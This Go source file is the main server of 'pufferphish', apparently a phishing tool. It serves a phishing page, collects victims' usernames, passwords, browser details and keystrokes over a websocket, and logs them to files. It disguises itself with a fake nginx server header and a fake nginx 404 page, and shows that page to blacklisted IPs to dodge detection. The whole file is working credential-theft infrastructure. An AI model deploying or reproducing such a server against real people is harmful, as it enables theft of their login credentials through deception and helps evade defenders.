package main

import (
	"encoding/json"
	"fmt"
	"os"
	"strings"

	"github.com/gofiber/contrib/websocket"
	"github.com/gofiber/fiber/v2"
	"github.com/gofiber/template/html/v2"
	"github.com/ngn13/pufferphish/config"
	"github.com/ngn13/pufferphish/log"
	"github.com/ngn13/pufferphish/session"
	"github.com/ngn13/pufferphish/util"
)

var conf config.Type

func blacklist(c *fiber.Ctx) error{
  var ip string
  if conf.IPHeader == "" || strings.ToLower(conf.IPHeader) == "none" {
    ip = c.IP()
  }else {
    ip = c.Get(conf.IPHeader)
  }

  for _, b := range conf.Blacklist {
    if b == ip {
      return notfound(c)
    }
  }

  return c.Next()
}

func phish(c *fiber.Ctx) error {
  sess := session.New()
  return c.Render(conf.Template, &fiber.Map{
    "static": util.Join(conf.Path, "static"),
    "report": util.Join(conf.Path, "report"),
    "session": sess,
  })
}

func notfound(c *fiber.Ctx) error {
  c.Set("Content-Type", "text/html; charset=utf-8")

  // fake nginx 404 page
  return c.Status(404).SendString(`<html>
<head><title>404 Not Found</title></head>
<body>
<center><h1>404 Not Found</h1></center>
<hr><center>nginx</center>
</body>
</html>
`)

}

func reportws(c *websocket.Conn) {
  var (
    message []byte
    err error
    ip string
    mt int
  )

  if conf.IPHeader == "" || strings.ToLower(conf.IPHeader) == "none" {
    ip = c.IP()
  }else {
    ip = c.Headers(conf.IPHeader)
  }

  var file log.File = log.File{
    IP: ip,
  }

  for {
    var data map[string]string

    if mt, message, err = c.ReadMessage(); err != nil {
      break
    }

    err = json.Unmarshal(message, &data)
    if err != nil {
      break
    }

    if data["session"] == ""{
      break
    }

    if !session.Contains(data["session"]) {
      break
    }
    file.Session = data["session"]

    if data["browser"] != "" {
      file.Write("INFO", fmt.Sprintf("Detected browser: %s", data["browser"]))
      continue
    }

    if data["username"] != "" || data["password"] != "" {
      file.Write("LOGIN", fmt.Sprintf("Username: %s", data["username"]))
      file.Write("LOGIN", fmt.Sprintf("Password: %s", data["password"]))

      ret := make(map[string]bool)
      ret["done"] = true

      msg, err := json.Marshal(&ret)
      if err != nil {
        log.Err("Failed to dump JSON response: %s", err.Error())
        break
      }

      c.WriteMessage(mt, msg)
      break
    }

    if data["key"] != "" {
      file.Write("KEY", data["key"])
    }
  }
}

func report(c *fiber.Ctx) error {
  if websocket.IsWebSocketUpgrade(c) {
    return c.Next()
  }
  return c.Status(426).Send([]byte{})
}

func main(){
  err := conf.Read()

  if err != nil {
    log.Err("Failed to read configuration: %s", err.Error())
    os.Exit(1)
  }

  engine := html.New("./templates", ".html")

  app := fiber.New(fiber.Config{
    DisableStartupMessage: true,
    ServerHeader: "nginx", // fake
    Views: engine,
  })

  app.Static(util.Join(conf.Path, "static"), "./static")
  app.Use("*", blacklist)

  app.Use(util.Join(conf.Path, "report"), report)
  app.Get(util.Join(conf.Path, "report"), websocket.New(reportws))

  app.Get(conf.Path, phish)

  app.All("*", notfound)

  log.Info("Starting the pufferphish on %s 🐡", conf.Host)
  log.Info("The phishing template is served at %s", conf.Path)

  err = app.Listen(conf.Host);
  if err != nil {
    log.Err("Failed to start the server: %s", err.Error())
    os.Exit(1)
  }
}
